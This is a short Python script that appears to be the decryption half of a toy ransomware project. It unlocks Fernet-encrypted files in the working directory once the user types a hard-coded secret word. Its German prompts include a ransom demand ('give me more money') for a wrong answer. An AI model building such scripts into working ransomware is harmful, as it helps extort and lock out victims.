import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "kill.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)



print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Gebe das geheime wort ein um deine Datein zu entschlüsseln")

if user_phrase == secretphrase:
	for file in files:
		with open (file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Deine Datein sind nun entschlüsselt.")
else:
	print("Falsches Wort gib mir mehr Geld")
